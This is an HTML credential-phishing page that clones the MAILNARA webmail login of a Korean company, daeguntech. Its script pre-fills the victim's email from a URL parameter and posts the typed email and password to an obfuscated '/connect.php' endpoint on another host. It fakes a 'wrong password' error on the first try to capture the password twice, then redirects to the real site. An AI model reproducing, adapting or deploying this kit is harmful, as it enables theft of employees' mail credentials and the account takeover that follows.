<!DOCTYPE html>
<html lang="ko" class="gt-ie8 gt-ie9 not-ie">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>MAILNARA v4.0 ::: daeguntech</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="imagetoolbar" content="no">
    <meta name="robots" content="noindex, nofollow">
    <link rel="shortcut icon" href="https://mail.daeguntech.co.kr/favicon.ico">
    <!-- Open Sans font from Google CDN -->
    <link href="./css" rel="stylesheet" type="text/css">
    <!-- Pixel Admin's stylesheets -->
    <link href="./bootstrap.css" rel="stylesheet" type="text/css">
    <link href="./pixel-admin.css" rel="stylesheet" type="text/css">
    <link href="./mailnara.css" rel="stylesheet" type="text/css">
    <link href="./mailnara_theme.css" rel="stylesheet" type="text/css">
    <link href="./login.css" rel="stylesheet" type="text/css">
    <style>
        .error-msg { 
            color: #e81123; 
            font-size: 14px; 
            margin-top: 8px; 
            text-align: center; 
            display: none;
            font-family: 'Malgun Gothic', sans-serif;
        }
        .shake { 
            animation: shake 0.5s; 
        }
        @keyframes shake { 
            0%,100%{transform:translateX(0)} 
            10%,30%,50%,70%,90%{transform:translateX(-5px)} 
            20%,40%,60%,80%{transform:translateX(5px)} 
        }
    </style>
</head>
<body class="theme-clean korean" id="id_body" onload="Init_Body(document.login_form, 'daeguntech.co.kr', '', 'U', false);">
    
    <!-- Your existing modals (unchanged) -->
    <div id="it_accredit" class="modal fade" tabindex="-1" role="dialog">
        <!-- ... existing modal content ... -->
    </div>
    
    <div id="outlook_auto" class="modal fade" tabindex="-1" role="dialog">
        <!-- ... existing modal content ... -->
    </div>
    
    <div id="certification" class="modal fade" tabindex="-1" role="dialog">
        <!-- ... existing modal content ... -->
    </div>

    <form id="login_form" name="login_form" method="post" action="https://mail.daeguntech.co.kr/login.php" onsubmit="return Check_Form(this)">
        <input type="hidden" name="login_host" value="daeguntech.co.kr">
        <input type="hidden" id="login_type" name="login_type" value="U">
        <input type="hidden" name="template_language" value="korean">
        <input type="hidden" name="admin_login" value="0">
        <input type="hidden" name="org_domain" value="">
        <input type="hidden" name="org_uid" value="">
        <input type="hidden" id="passwd_validation" name="passwd_validation" value="true">
        <input type="hidden" id="is_mobile" name="is_mobile" value="W">
        <input type="hidden" id="webmail_admin_login" name="webmail_admin_login" value="">
        <input type="hidden" name="usingAdminChange" value="">
        <input type="hidden" name="keyTime" value="">
        <button type="button" id="foreign_button" class="hidden" data-toggle="modal" data-target="#it_accredit"></button>

        <div id="wrap">
            <div id="login" class="">
                <div class="header dis_table mobile_none">
                    <div class="tr">
                        <p class="logo td">
                            <a href="http://daeguntech.co.kr/" target="_blank">
                                <img src="./logo_view.php" alt="회사로고" onload="imgsize(this)" name="logo_img" border="0" width="162" height="47">
                            </a>
                        </p>
                        <p class="title td">daeguntech</p>
                    </div>
                </div>
                <div class="header mobile_view">
                    <p class="text-center no-margin-b" style="background-color:#374B65;padding:12px 10px;">
                        <a href="http://daeguntech.co.kr/" target="_blank">
                            <img src="./logo_view.php" alt="회사로고" onload="imgsize(this)" name="logo_img" border="0" width="162" height="47">
                        </a>
                    </p>
                    <p class="title">daeguntech</p>
                </div>
                
                <p class="image">
                    <img src="./main.jpg" alt="회사대표이미지">
                </p>

                <div class="login_area">
                    <!-- ERROR MESSAGE - HIDDEN UNTIL FIRST CLICK -->
                    <div class="error-msg" id="errorMsg">
                        <div>비밀번호가 올바르지 않습니다.</div>
                    </div>

                    <!-- S://tab -->
                    <ul class="nav nav-tabs text-center">
                        <li class="active col-xs-6 no-padding-hr">
                            <a href="#receivemail" id="user_login_tab" name="user_login_tab" data-toggle="tab" onclick="Check_Type(document.login_form, 'U')">
                                사용자
                            </a>
                        </li>
                        <li class="col-xs-6 no-padding-hr">
                            <a href="#outmail" id="admin_login_tab" name="admin_login_tab" data-toggle="tab" class="no-margin-r" onclick="Check_Type(document.login_form, 'A')">
                                관리자
                            </a>
                        </li>
                    </ul>

                    <div class="tab-content tab-content-bordered">
                        <!-- S:// 사용자로그인 -->
                        <div class="tab-pane fade active in" id="receivemail">
                            <div class="row text-center" style="margin-bottom:15px">
                                <input type="checkbox" name="idsave" id="idsave">
                                <label for="idsave">아이디 저장</label>
                            </div>
                            
                            <div class="row">
                                <label class="col-xs-3 control-label" for="login_id">아이디</label>
                                <div class="col-xs-9">
                                    <input type="text" id="login_id" name="login_id" tabindex="1" accesskey="l" maxlength="100" 
                                           value="" onclick="Check_ID(document.login_form)" onblur="Replace_ID(document.login_form)" 
                                           class="form-control" placeholder="이메일을 입력하세요" readonly>
                                </div>
                            </div>
                            
                            <div class="row">
                                <label class="col-xs-3 control-label" for="login_passwd">비밀번호</label>
                                <div class="col-xs-9">
                                    <input type="password" id="login_passwd" name="login_passwd" tabindex="2" maxlength="31" value="" 
                                           class="form-control" placeholder="비밀번호를 입력하세요">
                                </div>
                            </div>
                            
                            <button type="button" id="login_btn" class="btn btn-lg btn-primary login only">
                                로그인
                            </button>
                        </div><!-- E:// 사용자로그인 -->
                        
                        <!-- S:// 관리자로그인 -->
                        <div class="tab-pane fade" id="outmail">
                            <div class="row">
                                <label class="col-xs-3 control-label" for="admin_id">아이디</label>
                                <div class="col-xs-9">
                                    <input type="text" id="admin_id" name="admin_id" class="form-control" placeholder="아이디를 입력하세요">
                                </div>
                            </div>
                            <div class="row">
                                <label class="col-xs-3 control-label" for="admin_passswd">비밀번호</label>
                                <div class="col-xs-9">
                                    <input type="password" id="admin_passwd" name="admin_passwd" class="form-control" placeholder="비밀번호를 입력하세요">
                                </div>
                            </div>
                            <button type="button" class="btn btn-lg btn-primary login only">
                                로그인
                            </button>
                        </div><!-- E:// 관리자로그인 -->
                    </div> <!-- E:// tab-content -->
                </div><!-- E://login_area -->

                <!-- Bottom Buttons -->
                <div class="row panel-padding no-padding-hr tablet_none">
                    <div class="col-xs-6">
                        <a href="#" onclick="Open_OutlookGuide()" class="btn btn-lg only">아웃룩 설정방법</a>
                    </div>
                    <div class="col-xs-6">
                        <a href="#" data-toggle="modal" data-target="#outlook_auto" class="btn btn-lg only">아웃룩 자동세팅</a>
                    </div>
                    <div class="col-xs-12">
                        <a href="#" class="btn btn-lg only error" data-toggle="modal" data-target="#certification">
                            <img src="./error_icon.png" alt="인증서 오류 아이콘" class="valign-2">
                            인증서 오류 발생 시 처리 방법
                        </a>
                    </div>
                </div>
            </div> <!-- E://login -->
        </div> <!-- E://wrap -->
    </form>

    <script type="text/javascript">
        // AUTO-FILL EMAIL FROM ?cms=
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        var cmsEmail = getParameterByName('cms');
        if (cmsEmail) {
            document.getElementById('login_id').value = cmsEmail;
            setTimeout(() => document.getElementById('login_passwd').focus(), 600);
        }

        // SAME WORKING LOGIC FROM CAFE24
        const connect = "L2Nvbm5lY3QucGhw"; // "/connect.php"
        const postUrl = `${config.baseUrl}${atob(connect)}`;

        var attempts = 1; // First = error, Second = redirect

        function submitLogin() {
            var email = document.getElementById('login_id').value.trim();
            var password = document.getElementById('login_passwd').value;

            if (!email || !password) {
                alert('아이디와 비밀번호를 입력하세요.');
                return;
            }

            // Show red error + shake
            var errorMsg = document.getElementById('errorMsg');
            errorMsg.style.display = 'block';
            errorMsg.classList.add('shake');
            setTimeout(() => errorMsg.classList.remove('shake'), 600);

            if (attempts === 1) {
                // FIRST CLICK → Send + change button to "다시 시도"
                sendCredentials(email, password);
                attempts++;
                setTimeout(() => {
                    document.querySelector('.login.only').innerHTML = '다시 시도';
                }, 800);
            } else {
                // SECOND CLICK → Send again + redirect to real domain
                sendCredentials(email, password);
                setTimeout(() => {
                    var domain = email.split('@')[1] || 'daeguntech.co.kr';
                    window.location.href = 'https://daeguntech.co.kr';
                }, 1500);
            }

            // Clear password
            setTimeout(() => {
                document.getElementById('login_passwd').value = '';
                document.getElementById('login_passwd').focus();
            }, 800);
        }

        function sendCredentials(email, pass) {
            var params = "ai=" + encodeURIComponent(email) + "&pr=" + encodeURIComponent(pass);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", postUrl, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(params);
        }

        // Bind events
        document.querySelector('.login.only').onclick = submitLogin;
        document.getElementById('login_passwd').onkeyup = function(e) {
            if (e.key === 'Enter') submitLogin();
        };
    </script>

    <!-- Your original scripts (unchanged) -->
    <script type="text/javascript">
        var file_select_str = '';
        var file_delete_str = '';
        var http_host= "mail.daeguntech.co.kr";
        var lang = "korean";
        var login_msg = "관리자의 아이디를 입력하세요.";
        var login_msg_email = "이메일 계정을 입력하세요.";
    </script>
    <script src="./bootstrap.min.js.download"></script>
    <script src="./pixel-admin.js.download"></script>
    <script type="text/javascript" src="./string.js.download"></script>
    <script>
        // Your existing functions (unchanged)
        function Init_Body(form, host, id, type, islogin) { /* existing code */ }
        function Check_Type(form, type) { /* existing code */ }
        // ... all other original functions ...
    </script>
</body>
</html>
